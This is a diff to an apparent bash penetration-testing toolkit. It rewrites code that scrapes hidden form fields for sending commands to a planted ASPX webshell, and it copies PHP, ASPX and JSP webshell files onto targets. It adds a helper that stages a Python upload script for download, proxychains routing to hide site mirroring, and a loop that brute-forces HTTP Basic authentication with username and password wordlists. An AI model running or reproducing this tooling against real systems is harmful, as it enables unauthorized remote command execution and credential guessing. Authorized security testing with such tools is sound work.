@@ -15,96 +15,41 @@ get_http_form() {
 
 
 extract_hidden_input() {
-    # Extract hidden inputs and format for curl -F
     local page=$1
     local target_form=$2
-    echo "$page" | awk -v target_form="$target_form" '
-    BEGIN { 
-
-        form_data = ""
-        in_form = 0
-        form_counter = 0
-        current_form_id = ""
-        target_form_found = 0
-    }
-    /<form[^>]*>/ {
-        in_form = 1
-        form_counter++
-        current_form_id = ""
-        
-        # Extract form id if present
-        if (match($0, /id="([^"]*)"/, arr)) {
-            current_form_id = arr[1]
-        } else if (match($0, /id='\''([^'\'']*)'\''/, arr)) {
-            current_form_id = arr[1]
-        }
-        
-        # If no target form specified, use first form
-        # If target form specified, check if this is the one
-        if (target_form == "" && form_counter == 1) {
-            target_form_found = 1
-        } else if (target_form != "" && current_form_id == target_form) {
-            target_form_found = 1
-        } else if (target_form != "" && target_form ~ /^[0-9]+$/ && form_counter == target_form) {
-            # Allow targeting by form number (1, 2, 3, etc.)
-            target_form_found = 1
-        } else {
-            target_form_found = 0
-        }
-        
-        next
-    }
-    /<\/form>/ {
-        in_form = 0
-        target_form_found = 0
-        next
-    }
-    in_form && target_form_found {
-        # Process multiple input tags on the same line
-        line = $0
-        while (match(line, /<input[^>]*type="hidden"[^>]*>/, input_match)) {
-            input_tag = substr(line, RSTART, RLENGTH)
-            
-            # Extract name and value attributes from this specific input tag
-            name = ""
-            value = ""
-            
-            # Match name attribute
-            if (match(input_tag, /name="([^"]*)"/, arr)) {
-                name = arr[1]
-            } else if (match(input_tag, /name='\''([^'\'']*)'\''/, arr)) {
-                name = arr[1]
-            } else if (match(input_tag, /name=([^[:space:]>]+)/, arr)) {
-                name = arr[1]
-            }
-            
-            # Match value attribute
-            if (match(input_tag, /value="([^"]*)"/, arr)) {
-                value = arr[1]
-            } else if (match(input_tag, /value='\''([^'\'']*)'\''/, arr)) {
-                value = arr[1]
-            } else if (match(input_tag, /value=([^[:space:]>]+)/, arr)) {
-                value = arr[1]
-            }
-            
-            # Add to form data if name exists
-            if (name != "") {
-                if (form_data != "") {
-                    form_data = form_data ","
-                }
-                form_data = form_data name "=" value
-            }
-            
-            # Remove the processed input tag and continue with the rest of the line
-            line = substr(line, RSTART + RLENGTH)
-        }
-        
-    }
-    END {
-        print form_data
-    }'
-
-
+    
+    # Extract the entire form first, then process all hidden inputs
+    local form_content
+    if [[ -z "$target_form" ]]; then
+        # Get first form
+        form_content=$(echo "$page" | sed -n '/<form[^>]*>/,/<\/form>/p' | head -n -0)
+    else
+        # Get specific form by ID or number
+        if [[ "$target_form" =~ ^[0-9]+$ ]]; then
+            # Target by form number
+            form_content=$(echo "$page" | awk -v target="$target_form" '
+                /<form[^>]*>/ { forms++; if(forms==target) start=1 }
+                start { print }
+                /<\/form>/ { if(start) exit }
+            ')
+        else
+            # Target by form ID
+            form_content=$(echo "$page" | awk -v target="$target_form" '
+                /<form[^>]*id="'$target_form'"[^>]*>/ { start=1 }
+                start { print }
+                /<\/form>/ { if(start) exit }
+            ')
+        fi
+    fi
+    
+    # Extract all hidden inputs from the form content
+    echo "$form_content" | grep -oE '<input[^>]*type="hidden"[^>]*>' | while read -r input; do
+        name=$(echo "$input" | sed -n 's/.*name="\([^"]*\)".*/\1/p')
+        value=$(echo "$input" | sed -n 's/.*value="\([^"]*\)".*/\1/p')
+        if [[ -n "$name" ]]; then
+            echo "${name}=${value}"
+        fi
+    done | paste -sd ','
 }
 
 
@@ -129,7 +74,8 @@ get_hidden_inputs() {
         echo "Using $proxy_option" >> $trail_log
     fi
     #echo curl -c $cookie_jar -s "$url" $proxy_option 
-    local page=$(curl -c $cookie_jar -s $proxy_option  "$url")
+    #echo curl -c $cookie_jar -s $proxy_option  $hidden_inputs_additional_options "$url"
+    local page=$(curl -b $cookie_jar -c $cookie_jar -s $proxy_option  $hidden_inputs_additional_options "$url")
     if [[ -z "$page" ]]; then
         echo "Failed to fetch the page. Please check the URL." >> $trail_log
         return 1
@@ -137,7 +83,7 @@ get_hidden_inputs() {
     extract_hidden_input "$page" "$target_form"
 }
 
-get_iis_hidden_input() {
+get_iis_hidden_inputs() {
     local url="$1"
     local target_form="$2"
     local hidden_inputs=$(get_hidden_inputs "$url" "$target_form")
@@ -158,7 +104,6 @@ get_post_hidden_inputs() {
 
 
 create_aspx_webshell() {
-
     cp $SCRIPTDIR/../aspx/webshell.aspx .
 
 }
@@ -174,7 +119,7 @@ run_aspx_shell_command() {
         return 1
     fi
     local proxy_option=""
-    local hidden_inputs=$(get_iis_hidden_input "$target_url")
+    local hidden_inputs=$(get_iis_hidden_inputs "$target_url")
     echo $hidden_inputs
     curl -b $cookie_jar -c $cookie_jar $target_url \
     -F "txtCommand=$cmd" \
@@ -199,6 +144,11 @@ create_php_web_shell() {
         sed -E -i '/title/d' webshell.php
         sed -E -i '/head/d' webshell.php
     fi
+}
+
+create_python_upload() {
+    cp $SCRIPTDIR/../python/upload.py .
+    generate_linux_download upload.py
 }
 
 create_jsp_webshell() {
@@ -322,7 +272,11 @@ download_web_folder() {
         echo "Target URL is not set."
         return 1
     fi
-    wget -r -nH -R 'index.html*' --no-parent $target_url
+    local proxy_option=""
+    if [[ ! -z $use_proxychain ]] && [[ $use_proxychain == true ]]; then
+        proxy_option="proxychains -q "
+    fi
+    ${proxy_option}wget -r -nH -R 'index.html*' --no-parent $target_url
     popd || return 1
 }
 
@@ -341,4 +295,67 @@ generate_php_hash() {
     sed -E -i "s/\{php_password\}/$php_password/g" password_hash.php
     sed -E -i "s/\{php_password_algorithm\}/$php_password_algorithm/g" password_hash.php
     php password_hash.php
+}
+
+verify_response() {
+    local user=$1
+    local pass=$2
+    response=$(curl -s -I -u $user:$pass $target_url)
+    if [[ -z $response ]]; then
+        echo "Response is empty."
+        return 1
+    fi
+    if echo "$response" | grep -q "401 Unauthorized"; then
+        #echo "Response indicates unauthorized access."
+        return 1
+    else
+        #echo "Response indicates authorized access for $user:$pass"
+        return 0
+    fi
+    
+}
+
+enumerate_basic_authentication() {
+    if [[ -z "$target_url" ]]; then
+        echo "Target IP is not set."
+        return 1
+    fi
+    if [[ -z $username ]] || [[ -z $password ]]; then
+        echo "Username or password is not set"
+        return 1
+    fi
+    response=""
+    if [[ -f $username ]]; then
+        while IFS= read -r user; do
+            if [[ -f $password ]]; then
+                while IFS= read -r pass; do
+                    if verify_response "$user" "$pass"; then
+                        echo "Authorized access for $user:$pass"
+                        return 0
+                    fi
+                done < "$password"
+                continue
+            else
+                if verify_response "$user" "$password"; then
+                    echo "Authorized access for $user:$password"
+                    return 0
+                fi
+            fi
+        done < "$username"
+    else
+        if [[ -f $password ]]; then
+            while IFS= read -r pass; do
+                if verify_response "$username" "$pass"; then
+                    echo "Authorized access for $username:$pass"
+                    return 0
+                fi
+            done < "$password"
+        else
+            if verify_response "$username" "$password"; then
+                echo "Authorized access for $username:$password"
+                return 0
+            fi
+        fi
+    fi
+
 }
